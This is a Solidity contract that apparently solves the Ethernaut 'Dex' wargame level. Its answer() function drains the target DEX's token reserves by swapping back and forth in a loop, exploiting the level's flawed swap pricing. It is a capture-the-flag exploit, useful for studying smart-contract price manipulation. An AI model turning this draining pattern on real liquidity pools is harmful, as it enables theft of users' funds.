// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.6.0;

import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.4/contracts/token/ERC20/IERC20.sol';

interface Dex {
    function token1() external view returns(address);
    function token2() external view returns(address);
    function swap(address from, address to, uint amount) external;
    function get_swap_price(address from, address to, uint amount) external view returns(uint);
    function approve(address spender, uint amount) external;
    function balanceOf(address token, address account) external view returns (uint);
}

contract Ethernaut {

    address public instance;
    address public token1;
    address public token2;

    constructor(address _instance) public {
        instance = _instance;
        token1 = Dex(instance).token1();
        token2 = Dex(instance).token2();

        // approve for dex
        IERC20(token1).approve(instance,uint(-1));
        IERC20(token2).approve(instance,uint(-1));
    }

    function get_max_input(address from) public view returns (uint){
        return  IERC20(from).balanceOf(instance);
    }

    function answer() external {
        // need approve from user first
        IERC20(token1).transferFrom(msg.sender,address(this), IERC20(token1).balanceOf(msg.sender));
        IERC20(token2).transferFrom(msg.sender,address(this), IERC20(token2).balanceOf(msg.sender));

        while(IERC20(token1).balanceOf(instance)>0 && IERC20(token2).balanceOf(instance)>0 ){
            // swap token1 to token2
            if(IERC20(token2).balanceOf(instance)>0){
                uint _my_balance = IERC20(token1).balanceOf(address(this));
                uint _max = get_max_input(token1);
                Dex(instance).swap(token1,token2,_max>_my_balance?_my_balance:_max);
            }
            // swap token2 to token1
            if(IERC20(token1).balanceOf(instance)>0){
                uint _my_balance = IERC20(token2).balanceOf(address(this));
                uint _max = get_max_input(token2);
                Dex(instance).swap(token2,token1,_max>_my_balance?_my_balance:_max);
            }
        }
    }
}
